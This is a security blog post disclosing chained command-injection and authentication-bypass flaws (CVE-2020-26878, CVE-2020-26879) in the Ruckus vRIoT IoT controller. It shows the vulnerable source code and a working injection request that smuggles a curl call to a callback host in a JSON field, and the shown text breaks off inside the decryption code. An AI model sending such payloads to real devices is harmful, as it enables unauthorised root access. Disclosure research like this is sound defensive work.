<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="Adepts of 0xCC" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="Adepts of 0xCC" /> <title> Remote Command Execution in Ruckus IoT Controller (CVE-2020-26878 &amp; CVE-2020-26879) - Adepts of 0xCC </title> <link rel="alternate" href="https://adepts.of0x.cc/Ruckus-VRIOT-RCE/" hreflang="en-US" /> <link rel="canonical" href="https://adepts.of0x.cc/Ruckus-VRIOT-RCE/" /> <meta name="description" content="Description of a RCE found in Ruckus vriot. Proof of Concept inside." /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="Remote Command Execution in Ruckus IoT Controller (CVE-2020-26878 &amp; CVE-2020-26879) | " /> <meta property="og:title" content="Remote Command Execution in Ruckus IoT Controller (CVE-2020-26878 &amp; CVE-2020-26879) | " /> <meta property="og:type" content="website" /> <meta property="og:url" content="https://adepts.of0x.cc/Ruckus-VRIOT-RCE/" /> <meta property="og:description" content="Description of a RCE found in Ruckus vriot. Proof of Concept inside." /> <meta property="og:image" content="https://adepts.of0x.cc/assets/img/ogp.png" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="Remote Command Execution in Ruckus IoT Controller (CVE-2020-26878 &amp; CVE-2020-26879) | AdeptsOf0xCC" /> <meta name="twitter:url" content="https://adepts.of0x.cc/Ruckus-VRIOT-RCE/" /> <meta name="twitter:site" content="@AdeptsOf0xCC" /> <meta name="twitter:creator" content="@AdeptsOf0xCC" /> <meta name="twitter:description" content="Description of a RCE found in Ruckus vriot. Proof of Concept inside." /> <meta name="twitter:image" content="https://adepts.of0x.cc/assets/img/ogp.png" /> <link type="application/atom+xml" rel="alternate" href="https://adepts.of0x.cc/feed.xml" title="Adepts of 0xCC" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a><a class="menu-link rss" href="/feed.xml"> <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 512 512" fill="#ED812E" > <title>RSS</title> <path d="M108.56,342.78a60.34,60.34,0,1,0,60.56,60.44A60.63,60.63,0,0,0,108.56,342.78Z" /> <path d="M48,186.67v86.55c52,0,101.94,15.39,138.67,52.11s52,86.56,52,138.67h86.66C325.33,312.44,199.67,186.67,48,186.67Z" /> <path d="M48,48v86.56c185.25,0,329.22,144.08,329.22,329.44H464C464,234.66,277.67,48,48,48Z" /> </svg> </a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#vulnerabilities">VULNERABILITIES</a>, <a class="tag" href="/tags/#research">RESEARCH</a>, <a class="tag" href="/tags/#x-c3ll">X-C3LL</a> </span> </div> <h1 class="header-title" itemprop="headline">Remote Command Execution in Ruckus IoT Controller (CVE-2020-26878 &amp; CVE-2020-26879)</h1> <div class="post-meta"> <time datetime="2020-10-25T02:00:00+02:00" itemprop="datePublished"> Oct 25, 2020 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">Adepts of 0xCC</span> </span> <time hidden datetime="2020-10-25T02:00:00+02:00" itemprop="dateModified"> Oct 25, 2020 </time> <span hidden itemprop="publisher" itemtype="Person">Adepts of 0xCC</span> <span hidden itemprop="image"></span> <span hidden itemprop="mainEntityOfPage"><p>Dear Fell<strong>owl</strong>ship, today’s homily is about two vulnerabilites (CVE-2020-26878 and CVE-2020-26879) found in Ruckus vRIoT, that can be chained together to get remote command execution as root. Please, take a seat and listen to the story.</p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p>Dear Fell<strong>owl</strong>ship, today’s homily is about two vulnerabilites (CVE-2020-26878 and CVE-2020-26879) found in Ruckus vRIoT, that can be chained together to get remote command execution as root. Please, take a seat and listen to the story.</p> <h1 id="prayers-at-the-foot-of-the-altar-aka-disclaimer"> <a href="#prayers-at-the-foot-of-the-altar-aka-disclaimer" class="anchor-head"></a> Prayers at the foot of the Altar a.k.a. disclaimer </h1> <p><em>We reported the vulnerability to the Ruckus Product Security Team this summer (26/Jul/2020) and they instantly checked and acknowledged the issues. After that, both parts agreed to set the disclosure date to October the 26th (90 days). We have to say that the team was really nice to us and that they kept us informed every month. If only more vendors had the same good faith.</em></p> <h1 id="introduction"> <a href="#introduction" class="anchor-head"></a> Introduction </h1> <p>Every day more people are turning their homes into “Smart Homes”, so we are developing an immeasurable desire to find vulnerabilities in components that manage IoT devices in some way. We discovered the “Ruckus IoT Suite” and wanted to hunt for some vulnerabilities. We focused in Ruckus IoT Controller (Ruckus vRIoT), which is a virtual component of the “IoT Suite” in charge of integrating IoT devices and IoT services via exposed APIs.</p> <figure> <img src="/Ruckus-VRIOT-RCE/ruckus-vriot-iot-controller.png" alt="Ruckus IoT architecture" /> <figcaption> Example of IoT architecture with Ruckus platforms (extracted from their website) </figcaption> </figure> <p>This software is provided as a VM in OVA format (<a href="https://support.ruckuswireless.com/software/2531-ruckus-iot-1-5-1-0-21-ga-vriot-server-software-release-ova-install-image">Ruckus IoT 1.5.1.0.21 (GA) vRIoT Server Software Release</a>), so it can be run by VMware and VirtualBox. This is a good way of obtaining and analyzing the software, as it serves as a testing platform.</p> <h1 id="warming-up"> <a href="#warming-up" class="anchor-head"></a> Warming up </h1> <p>Our first step is to perform a bit of recon to check the attack surface, so we run the OVA inside a hypervisor and execute a simple port scan to list exposed services:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE    SERVICE    REASON      VERSION
22/tcp    open     ssh        syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http       syn-ack     nginx
443/tcp   open     ssl/http   syn-ack     nginx
4369/tcp  open     epmd       syn-ack     Erlang Port Mapper Daemon
5216/tcp  open     ssl/http   syn-ack     Werkzeug httpd 0.12.1 (Python 3.5.2)
5672/tcp  open     amqp       syn-ack     RabbitMQ 3.5.7 (0-9)
9001/tcp  filtered tor-orport no-response
25672/tcp open     unknown    syn-ack
27017/tcp filtered mongod     no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div> <p>There are some interesting services. If we try to log in via SSH (admin/admin), we obtain a restricted menu where we can barely do anything:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 - Ethernet Network
2 - System Details
3 - NTP Setting
4 - System Operation
5 - N+1
6 - Comm Debugger
x - Log Off
</code></pre></div></div> <p>So our next step should be to get access to the filesystem and understand how this software works. We could not jailbreak the restricted menu, so we need to extract the files in a less fancy way: let’s sharpen our claws to gut the vmdk files.</p> <p>In the end an OVA file is just a package that holds all the components needed to virtualize a system, so we can extract its contents and mount the virtual machine disk with the help of qemu and the NBD driver.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7z e file.ova
<span class="nb">sudo </span>modprobe nbd
<span class="nb">sudo </span>qemu-nbd <span class="nt">-r</span> <span class="nt">-c</span> /dev/nbd1 file.vmdk
<span class="nb">sudo </span>mount /dev/nbd1p1 /mnt
</code></pre></div></div> <p>If that worked you can now access the whole filesystem:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psyconauta@insulanova:/mnt|⇒  ls
bin      data  home        lib64       mqtt-broker  root  srv  usr      VRIOT
boot     dev   initrd.img  lost+found  opt          run   sys  var      vriot.d
cafiles  etc   lib         mnt         proc         sbin  tmp  vmlinuz
</code></pre></div></div> <p>We can see in the /etc/passwd file that the user “admin” does not have a regular shell:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin:x:1001:1001::/home/admin:/VRIOT/ops/scripts/ras
</code></pre></div></div> <p>That <code class="language-plaintext highlighter-rouge">ras</code> file is a bash script that corresponds to the restricted menu that we saw before.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BANNERNAME="                                Ruckus IoT Controller"
MENUNAME="                                      Main Menu"

if [ $TERM = "ansi" ]
then
set TERM=vt100
export TERM
fi

main_menu () {
draw_screen
get_input
check_input
if [ $? = 10 ] ; then main_menu ; fi
}


##------------------------------------------------------------------------------------------------
draw_screen () {
clear
echo "*******************************************************************************"
echo "$BANNERNAME"
echo "$MENUNAME"
echo "*******************************************************************************"
echo ""
echo "1 - Ethernet Network"
echo "2 - System Details"
echo "3 - NTP Setting"
echo "4 - System Operation"
echo "5 - N+1"
echo "6 - Comm Debugger"
echo "x - Log Off"
echo
echo -n "Enter Choice: "
}
...
</code></pre></div></div> <h1 id="remote-command-injection-cve-2020-26878"> <a href="#remote-command-injection-cve-2020-26878" class="anchor-head"></a> Remote Command Injection (CVE-2020-26878) </h1> <p>Usually all these IoT routers/switches/etc with web interface contain functions that execute OS commands using user-controlled input. That means that if the input is not correctly sanitized, we can inject arbitrary commands. This is the lowest hanging fruit that always has to be checked, so our first task is to find the files related to the web interface:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psyconauta@insulanova:/mnt/VRIOT|⇒  find -iname "*web*" 2&gt; /dev/null
./frontend/build/static/media/fontawesome-webfont.912ec66d.svg
./frontend/build/static/media/fontawesome-webfont.af7ae505.woff2
./frontend/build/static/media/fontawesome-webfont.674f50d2.eot
./frontend/build/static/media/fontawesome-webfont.b06871f2.ttf
./frontend/build/static/media/fontawesome-webfont.fee66e71.woff
./ops/packages_151/node_modules/faye-websocket
./ops/packages_151/node_modules/faye-websocket/lib/faye/websocket.js
./ops/packages_151/node_modules/faye-websocket/lib/faye/websocket
./ops/packages_151/node_modules/node-red-contrib-kontakt-io/node_modules/ws/lib/WebSocketServer.js
./ops/packages_151/node_modules/node-red-contrib-kontakt-io/node_modules/ws/lib/WebSocket.js
./ops/packages_151/node_modules/node-red-contrib-kontakt-io/node_modules/mqtt/test/websocket_client.js
./ops/packages_151/node_modules/node-red-contrib-kontakt-io/node_modules/websocket-stream
./ops/packages_151/node_modules/sockjs/lib/webjs.js
./ops/packages_151/node_modules/sockjs/lib/trans-websocket.js
./ops/packages_151/node_modules/websocket-extensions
./ops/packages_151/node_modules/websocket-extensions/lib/websocket_extensions.js
./ops/packages_151/node_modules/node-red-contrib-web-worldmap
./ops/packages_151/node_modules/node-red-contrib-web-worldmap/worldmap/leaflet/font-awesome/fonts/fontawesome-webfont.woff
./ops/packages_151/node_modules/node-red-contrib-web-worldmap/worldmap/leaflet/font-awesome/fonts/fontawesome-webfont.svg
./ops/packages_151/node_modules/node-red-contrib-web-worldmap/worldmap/leaflet/font-awesome/fonts/fontawesome-webfont.woff2
./ops/packages_151/node_modules/websocket-driver
./ops/packages_151/node_modules/websocket-driver/lib/websocket
./ops/docker/webservice
./ops/docker/webservice/web_functions.py
./ops/docker/webservice/web_functions_helper.py
./ops/docker/webservice/web.py
</code></pre></div></div> <p>This way we identified several web-related files, and that the web interface is built on top of python scripts. In python there are lots of dangerous functions that, when used incorrectly, can lead to arbitrary code/command execution. The easy way is to try to find <code class="language-plaintext highlighter-rouge">os.system()</code> calls with user-controlled data in the main web file. A simple grep will shed light:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psyconauta@insulanova:/mnt/VRIOT|⇒  grep -i "os.system" ./ops/docker/webservice/web.py -A 5 -B 5
            reqData = json.loads(request.data.decode())
        except Exception as err:
            return Response(json.dumps({"message": {"ok": 0,"data":"Invalid JSON"}}), 200)
        userpwd = 'useradd '+reqData['username']+' ; echo  "'+reqData['username']+':'+reqData['password']+'" | chpasswd &gt;/dev/null 2&gt;&amp;1'
        #call(['useradd ',reqData['username'],'; echo',userpwd,'| chpasswd'])
        os.system(userpwd)
        call(['usermod','-aG','sudo',reqData['username']],stdout=devNullFile)
    except Exception as err:
        print("err=",err)
        devNullFile.close()
        return errorResponseFactory(str(err), status=400)
--
            slave_ip = reqData['slave_ip']
            if reqData['slave_ip'] != config.get("vm_ipaddress"):
                master_ip = reqData['slave_ip']
                slave_ip = reqData['master_ip']
            crontab_str = "crontab -l | grep -q 'ha_slave.py' || (crontab -l ; echo '*/5 * * * * python3 /VRIOT/ops/scripts/haN1/ha_slave.py 1 "+master_ip+" "+slave_ip+" &gt;&gt; /var/log/cron_ha.log 2&gt;&amp;1') | crontab -"
            os.system(crontab_str)
            #os.system("python3 /VRIOT/ops/scripts/haN1/n1_process.py &gt; /dev/null 2&gt;&amp;1 &amp;")
    except Exception as err:
        devNullFile.close()
        return errorResponseFactory(str(err), status=400)
    else:
        devNullFile.close()
--
        call(['rm','-rf','/etc/corosync/authkey'],stdout=devNullFile)
        call(['rm','-rf','/etc/corosync/corosync.conf'],stdout=devNullFile)
        call(['rm','-rf','/etc/corosync/service.d/pcmk'],stdout=devNullFile)
        call(['rm','-rf','/etc/default/corosync'],stdout=devNullFile)
        crontab_str = "crontab -l | grep -v 'ha_slave.py' | crontab -"
        os.system(crontab_str)
        
        cmd = "supervisorctl status all | awk '{print $1}'"
        process_list = check_output(cmd,shell=True).decode('utf-8').split("\n")
        for process in process_list:
            if process and process != 'nplus1_service':
--
                        call(['service','sshd','stop'])
                        config.update("vm_ssh_enable","0")
                    call(['supervisorctl','restart','app:mqtt_service'])
                    call(['supervisorctl', 'restart', 'celery:*'])
                    if reqData["vm_ssh_enable"] == "0":
                        os.system("kill $(ps aux | grep 'ssh' | awk '{print $2}')")
            except Exception as err:
                return Response(json.dumps({"message": {"ok": 0,"data":"Invalid JSON"}}), 200)
        elif request.method == 'GET':
                response_json = {
                    "offline_upgrade_enable" : config.get("offline_upgrade_enable"),
</code></pre></div></div> <p>The first occurrence already looks like vulnerable to command injection. When checking that code snippet we can observe that it is in fact vulnerable:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/service/v1/createUser"</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
<span class="o">@</span><span class="n">token_required</span>
<span class="k">def</span> <span class="nf">create_ha_user</span><span class="p">():</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">devNullFile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">devnull</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">reqData</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"message"</span><span class="p">:</span> <span class="p">{</span><span class="s">"ok"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span><span class="s">"data"</span><span class="p">:</span><span class="s">"Invalid JSON"</span><span class="p">}}),</span> <span class="mi">200</span><span class="p">)</span>
        <span class="n">userpwd</span> <span class="o">=</span> <span class="s">'useradd '</span><span class="o">+</span><span class="n">reqData</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span><span class="o">+</span><span class="s">' ; echo  "'</span><span class="o">+</span><span class="n">reqData</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span><span class="o">+</span><span class="s">':'</span><span class="o">+</span><span class="n">reqData</span><span class="p">[</span><span class="s">'password'</span><span class="p">]</span><span class="o">+</span><span class="s">'" | chpasswd &gt;/dev/null 2&gt;&amp;1'</span>
        <span class="c1">#call(['useradd ',reqData['username'],'; echo',userpwd,'| chpasswd'])
</span>        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">userpwd</span><span class="p">)</span>
        <span class="n">call</span><span class="p">([</span><span class="s">'usermod'</span><span class="p">,</span><span class="s">'-aG'</span><span class="p">,</span><span class="s">'sudo'</span><span class="p">,</span><span class="n">reqData</span><span class="p">[</span><span class="s">'username'</span><span class="p">]],</span><span class="n">stdout</span><span class="o">=</span><span class="n">devNullFile</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"err="</span><span class="p">,</span><span class="n">err</span><span class="p">)</span>
        <span class="n">devNullFile</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div> <p>We can see how, when calling the <strong>/service/v1/createUser</strong> endpoint, some parameters are directly taken from the POST request body (JSON-formatted) and concatenated to a <code class="language-plaintext highlighter-rouge">os.system()</code> call. As this concatenation is done without proper sanitization, we can inject arbitrary commands with <code class="language-plaintext highlighter-rouge">;</code>. The vulnerability is easily confirmed using an HTTP server (<code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer</code>) as canary:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://host/service/v1/createUser <span class="nt">-k</span> <span class="nt">--data</span> <span class="s1">'{"username": ";curl http://TARGET:8000/pwned;#", "password": "test"}'</span> <span class="nt">-H</span> <span class="s2">"Authorization: Token 47de1a54fa004793b5de9f5949cf8882"</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span>

</code></pre></div></div> <p>Keep in mind that this method checks for a valid token (see the <code class="language-plaintext highlighter-rouge">@token_required</code> at line two of the snippet), so we need to be authenticated in order to exploit it. Our next step is to find a way to circumvent this check to get an RCE as an unauthenticated user.</p> <h1 id="authentication-bypass-via-api-backdoor-cve-2020-26879"> <a href="#authentication-bypass-via-api-backdoor-cve-2020-26879" class="anchor-head"></a> Authentication bypass via API backdoor (CVE-2020-26879) </h1> <p>The first step to find a bypass would be to check the <code class="language-plaintext highlighter-rouge">token_required</code> function in order to understand how this “check” is performed:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">token_required</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
    <span class="o">@</span><span class="n">wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">wrapper</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>

        <span class="c1"># Localhost Authentication
</span>        <span class="k">if</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'X-Real-Ip'</span><span class="p">)</span> <span class="o">==</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'host'</span><span class="p">)):</span>
            <span class="k">return</span> <span class="n">f</span><span class="p">()</span>
        <span class="c1"># init call
</span>        <span class="k">if</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">path</span> <span class="o">==</span> <span class="s">'/service/init'</span> <span class="ow">and</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">f</span><span class="p">()</span>
        <span class="k">if</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">path</span> <span class="o">==</span> <span class="s">'/service/upgrade/flow'</span> <span class="ow">and</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">f</span><span class="p">()</span>

        <span class="c1"># N+1 Authentication  
</span>        <span class="k">if</span> <span class="s">"Token "</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'Authorization'</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'Auth='</span><span class="o">+</span><span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'Authorization'</span><span class="p">))</span>
            <span class="n">token</span> <span class="o">=</span> <span class="n">crpiot_obj</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'Authorization'</span><span class="p">))</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'Token='</span><span class="o">+</span><span class="n">token</span><span class="p">)</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/VRIOT/ops/scripts/haN1/service_auth"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fileobj</span><span class="p">:</span>
                <span class="n">auth_code</span> <span class="o">=</span> <span class="n">fileobj</span><span class="p">.</span><span class="n">read</span><span class="p">().</span><span class="n">rstrip</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">auth_code</span> <span class="o">==</span> <span class="n">token</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">f</span><span class="p">()</span>

        <span class="c1"># Normal Authentication
</span>        <span class="n">k</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"https://0.0.0.0/app/v1/controller/stats"</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Authorization'</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'Authorization'</span><span class="p">)},</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="n">k</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"detail"</span><span class="p">:</span> <span class="s">"Invalid Token."</span><span class="p">}),</span> <span class="mi">401</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">f</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">wrapper</span>
</code></pre></div></div> <p>Let’s ignore the header comparison <strong>:)</strong> and focus in the N+1 authentication. As you can see, if the Authorization header does not contain the word “Token”, the header value is decrypted and compared with a hardcoded value from a file (<code class="language-plaintext highlighter-rouge">/VRIOT/ops/scripts/haN1/service_auth</code>). The encryption / decryption routines can be found in the file <code class="language-plaintext highlighter-rouge">/VRIOT/ops/scripts/enc_dec.py</code>:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">salt</span><span class="o">=</span><span class="s">'nplusServiceAuth'</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">salt</span> <span class="o">=</span> <span class="n">salt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf8"</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">enc_dec_method</span> <span class="o">=</span> <span class="s">'utf-8'</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">str_key</span><span class="o">=</span><span class="n">config</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'n1_token'</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf8"</span><span class="p">)</span>




    <span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">str_to_enc</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">aes_obj</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">str_key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CFB</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">salt</span><span class="p">)</span>
            <span class="n">hx_enc</span> <span class="o">=</span> <span class="n">aes_obj</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">str_to_enc</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf8"</span><span class="p">))</span>
            <span class="n">mret</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">hx_enc</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">enc_dec_method</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">mret</span>
        <span class="k">except</span> <span class="nb">ValueError</span> <span class="k">as</span> <span class="n">value_error</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">value_error</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">'IV must be 16 bytes long'</span><span class="p">:</span>
                <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">'Encryption Error: SALT must be 16 characters long'</span><span class="p">)</span>
